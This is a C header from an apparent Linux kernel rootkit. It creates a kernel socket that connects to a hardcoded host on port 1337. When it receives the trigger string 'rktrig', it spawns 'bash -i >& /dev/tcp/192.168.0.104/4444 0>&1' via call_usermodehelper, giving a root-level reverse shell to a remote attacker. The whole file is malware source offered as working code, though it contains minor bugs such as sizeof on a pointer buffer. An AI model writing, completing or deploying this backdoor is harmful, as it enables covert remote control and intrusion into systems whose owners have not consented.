#pragma once
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/tcp.h>
// #include <string.h>

#define TRIGGER "rktrig"

#define PORT 1337
#define CREATE_ADDRESS(ip)                                                     \
  (((u32)(ip)[0] << 24) | ((u32)(ip)[1] << 16) | ((u32)(ip)[2] << 8) |         \
   ((u32)(ip)[3]))

int tcp_send(struct socket *sock, const char *buf, size_t len);
int tcp_recv(struct socket *sock, char *buf, size_t max_size);
int socket_init(struct socket *sock, struct task_struct *thread);
int exec_cmd(void);

int thread_task(void *data) {
  struct socket *sock = (struct socket *)data;
  char *buff = kmalloc(1024, GFP_KERNEL);
  if (buff == NULL) {
    printk(KERN_INFO "Failed to allocate memory for receive buffer\n");
    return -ENOMEM;
  }
  int ret;
  while (!kthread_should_stop()) {
    ret = tcp_recv(sock, buff, sizeof(buff));
    if (ret < 0) {
      printk(KERN_INFO "tcp_recv failed\n");
      break;
    }
    if (strncmp(buff, TRIGGER, strlen(TRIGGER)) == 0) {
      printk(KERN_INFO "Trigger received, creating reverse shell..");
      ret = exec_cmd();
      if (ret < 0) {
        printk(KERN_INFO "exec_cmd failed\n");
      }
    } else {
      continue;
    }

    msleep(100);
  }
  kfree(buff);
  return 0;
}

int exec_cmd(void) {
  // FIXME
  int ret;

  char *argv[] = {"/bin/bash", "-c",
                  "bash -i >& /dev/tcp/192.168.0.104/4444 0>&1", NULL};
  char *envp[] = {
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      NULL};

  ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  if (ret < 0) {
    printk(KERN_INFO "Failed to execute command\n");
    return ret;
  }
  return 0;
}

int socket_init(struct socket *sock, struct task_struct *thread) {
  struct sockaddr_in saddr;
  int err;
  int retry_count = 0;
  int max_retries = 3;
  int delay = 5000;

  u8 ip[4] = {192, 168, 0, 104};
  u32 addr = CREATE_ADDRESS(ip);

  memset(&saddr, 0, sizeof(saddr));
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(PORT);
  saddr.sin_addr.s_addr = htonl(addr);

  err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
  if (err < 0) {
    printk(KERN_INFO "Couldn't create a socket\n");
    return err;
  }
  printk(KERN_INFO "Socket created successfully");

  thread = kthread_create(thread_task, sock, "tcp_recv thread");
  if (IS_ERR(thread)) {
    printk(KERN_INFO "Cannot create tcp_recv thread\n");
    sock->ops->shutdown(sock, SHUT_RDWR);
    sock_release(sock);
    sock = NULL;
    return PTR_ERR(thread);
  }
  printk(KERN_INFO "Successfully created tcp_recv thread");

  while (retry_count <= max_retries) {
    err = sock->ops->connect(sock, (struct sockaddr *)&saddr, sizeof(saddr),
                             O_RDWR);
    if (err < 0) {
      printk(KERN_INFO "Couldn't connect to the destination (retry %d/%d)\n",
             retry_count, max_retries);
      retry_count++;
      msleep(delay);
      continue;
    } else {
      printk(KERN_INFO "Socket connected successfully\n");
      wake_up_process(thread);
      printk(KERN_INFO "tcp_recv thread is waking up\n");
      break;
    }
  }

  if (retry_count == max_retries && sock->sk->sk_state != TCP_ESTABLISHED) {
    printk(KERN_INFO "Failed to reconnect after %d tries\n", max_retries);
    sock->ops->shutdown(sock, SHUT_RDWR);
    sock_release(sock);
    sock = NULL;
    return -ECONNREFUSED;
  }
  return 0;
}

int tcp_send(struct socket *sock, const char *buf, const size_t len) {
  struct msghdr msg;
  struct kvec vec;
  int length;

  msg.msg_name = 0;
  msg.msg_namelen = 0;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_flags = 0;

  vec.iov_len = len;
  vec.iov_base = (char *)buf;
  if (sock && sock->sk && sock->sk->sk_state == TCP_ESTABLISHED) {
    length = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
    if (length < 0) {
      printk(KERN_INFO "Send error\n");
      return len;
    } else {
      printk(KERN_INFO "Message sent successfully\n");
    }
    printk(KERN_INFO "Bytes send: %d\n", length);
  } else {
    printk(KERN_INFO "Socket error\n");
    return -ENOTCONN;
  }
  return 0;
}

int tcp_recv(struct socket *sock, char *buf, size_t max_size) {
  struct msghdr msg;
  struct kvec vec;
  int len;

  msg.msg_name = 0;
  msg.msg_namelen = 0;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_flags = 0;

  vec.iov_len = max_size;
  vec.iov_base = buf;
  if (sock && sock->sk && sock->sk->sk_state == TCP_ESTABLISHED) {
    len = kernel_recvmsg(sock, &msg, &vec, 1, max_size, msg.msg_flags);
    if (len < 0) {
      printk(KERN_INFO "Error while receiving: %d\n", len);
      return len;
    }
    printk(KERN_INFO "Received %s\n", buf);
  } else {
    printk(KERN_INFO "Socket error\n");
    return -ENOTCONN;
  }
  return 0;
}
